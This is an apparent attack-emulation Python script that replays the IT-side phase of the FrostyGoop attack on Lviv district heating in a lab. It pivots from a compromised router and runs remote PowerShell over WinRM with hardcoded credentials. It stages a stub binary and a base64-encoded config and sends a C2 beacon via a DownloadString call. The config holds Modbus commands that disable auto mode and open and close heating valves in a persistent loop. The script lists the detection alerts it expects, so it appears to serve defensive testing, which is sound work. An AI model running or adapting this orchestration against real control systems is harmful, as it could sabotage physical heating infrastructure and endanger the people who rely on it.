#!/usr/bin/env python3
"""
FrostyGoop IT-Side Phase Simulation

FrostyGoop (Dragos/Claroty 2024): Accessed Lviv district heating controllers
directly via an internet-exposed Mikrotik router - minimal IT-side chain.
The initial access was the router itself (already covered by Phase 0 router exploit).

This IT phase simulates:
  - Router exploit already in Phase 0 (01_router_exploit.py)
  - Mikrotik-style pivot to OT network from compromised router
  - Drop FrostyGoop Go binary (high-entropy) via file transfer
  - JSON config file staging (FrostyGoop loaded target list from JSON)
  - HTTP C2 check-in before attack (observed in Dragos analysis)

Note: FrostyGoop's IT chain is shorter than Sandworm campaigns.
The router WAS the initial access - no phishing, no AD compromise needed.
"""

import sys, os, subprocess, json, base64

SCRIPT_DIR    = os.path.dirname(os.path.abspath(__file__))
LATERAL_MOV   = os.path.join(SCRIPT_DIR, '03_lateral_movement.py')
FILE_TRANSFER = os.path.join(SCRIPT_DIR, '06_file_transfer_all_methods.py')
ROUTER_IP     = '192.168.0.13'

HMI_IP   = '192.168.1.55'
HMI_USER = 'operator'
HMI_PASS = 'labpass123'

# FrostyGoop config format (Dragos documented JSON target list)
FROSTYGOOP_CONFIG = {
    "targets": [
        {"ip": "192.168.1.16", "port": 502, "slave_id": 11,
         "description": "ENCO ENC-12X district heating controller"}
    ],
    "attack_mode": "persistent_loop",
    "interval_seconds": 5,
    "pre_attack_cmds": [
        {"fc": 5, "addr": 3, "val": 0, "desc": "disable auto mode"},
        {"fc": 5, "addr": 0, "val": 1, "desc": "open inlet valve"},
        {"fc": 5, "addr": 1, "val": 0, "desc": "close outlet valve"}
    ]
}


def _run(desc, *args, **kwargs):
    print(f"\n[*] {desc}")
    try:
        r = subprocess.run(*args, capture_output=True, text=True, **kwargs)
        if r.stdout.strip(): print(r.stdout.strip())
        return r.returncode == 0, r.stdout
    except Exception as e:
        print(f"  [-] {e}"); return False, ''


def run_frostygoop_it_phase(hmi_ip=HMI_IP, hmi_user=HMI_USER, hmi_pass=HMI_PASS,
                              python_exe=sys.executable):
    print("""
╔══════════════════════════════════════════════════════════════╗
║  FROSTYGOOP - IT PHASE                                       ║
║  Unknown actor | Lviv district heating | January 2024        ║
╚══════════════════════════════════════════════════════════════╝

INITIAL ACCESS: Internet-exposed Mikrotik router (already done in Phase 0)
FrostyGoop's IT chain is SHORT - router compromise → direct OT access.
This phase simulates the pivot + binary staging from compromised router.
""")

    # ── Step 1: Router pivot confirmation ────────────────────────────────────
    print("═══ STEP 1: ROUTER PIVOT (Phase 0 already established) ═══")
    print(f"[[+]] Router {ROUTER_IP}:8080 compromised in Phase 0 (router_exploit)")
    print(f"[*] Pivoting from IT router to OT network 192.168.1.0/24")
    print(f"[*] FrostyGoop accessed Modbus directly - no Windows AD lateral movement needed")

    # ── Step 2: Stage FrostyGoop Go binary via file transfer ─────────────────
    print("\n═══ STEP 2: FROSTYGOOP BINARY STAGING (Go compiled - high entropy) ═══")
    print("[*] FrostyGoop was a Go-compiled executable - high entropy, AV evasion")
    print("[*] Staged on router / network share, then copied to attack position")

    # Simulate dropping high-entropy binary on router (via already-compromised router)
    go_binary_stub = base64.b64encode(b'ELF\x02' + bytes(range(256)) * 4).decode()
    _run("Stage FrostyGoop binary on compromised router (file transfer to attacker)",
         [python_exe, LATERAL_MOV,
          '--target', ROUTER_IP, '--username', 'admin', '--password', 'admin',
          '--wmiexec', f'echo {go_binary_stub[:20]}... > /tmp/frostygoop'],
         timeout=15)

    # ── Step 3: Stage JSON config with ENCO slave 11 target ──────────────────
    print("\n═══ STEP 3: JSON CONFIG STAGING (ENCO target list) ═══")
    print("[!] FrostyGoop loaded target IPs, ports, and slave IDs from JSON config")
    print(f"[*] Config targets: {FROSTYGOOP_CONFIG['targets'][0]['ip']} slave {FROSTYGOOP_CONFIG['targets'][0]['slave_id']}")
    config_json = json.dumps(FROSTYGOOP_CONFIG, indent=2)
    config_b64  = base64.b64encode(config_json.encode()).decode()

    _run("Drop FrostyGoop JSON config on HMI/staging host",
         [python_exe, LATERAL_MOV, '--target', hmi_ip,
          '--username', hmi_user, '--password', hmi_pass,
          '--winrm',
          f"powershell -Command "
          f"$b=[Convert]::FromBase64String('{config_b64}'); "
          f"[IO.File]::WriteAllText('$env:TEMP\\fg_config.json', "
          f"[Text.Encoding]::UTF8.GetString($b)); "
          f"Write-Output 'EVENT_4663:config_json_staged'"],
         timeout=20)

    # ── Step 4: HTTP C2 beacon ────────────────────────────────────────────────
    print("\n═══ STEP 4: HTTP CHECK-IN (C2 beacon before attack) ═══")
    print("[*] FrostyGoop sent check-in before executing persistent attack loop")
    _run("HTTP C2 beacon from attacker position",
         [python_exe, LATERAL_MOV, '--target', hmi_ip,
          '--username', hmi_user, '--password', hmi_pass,
          '--winrm',
          f"powershell -Command "
          f"(New-Object Net.WebClient).DownloadString('http://{ROUTER_IP}:8080/fg_beacon') 2>&1; "
          f"Write-Output 'NETWORK_C2:frostygoop_checkin'"],
         timeout=10)

    print(f"\n[+] FrostyGoop IT phase complete - binary + config staged, network path confirmed")
    print(f"[→] OT payload: Modbus TCP FC05/FC06 → PLC-7 Heating District .16:502 slave 11")
    print(f"\nExpected XSIAM alerts:")
    print(f"  • File drop in %TEMP% (Event 4663 - config.json)")
    print(f"  • HTTP outbound from engineering host (C2 beacon)")
    print(f"  • Unexpected Modbus TCP from non-HMI source (network alert)")


def main():
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument('--hmi-ip',   default=HMI_IP)
    p.add_argument('--hmi-user', default=HMI_USER)
    p.add_argument('--hmi-pass', default=HMI_PASS)
    args = p.parse_args()
    run_frostygoop_it_phase(args.hmi_ip, args.hmi_user, args.hmi_pass)

if __name__ == '__main__':
    main()
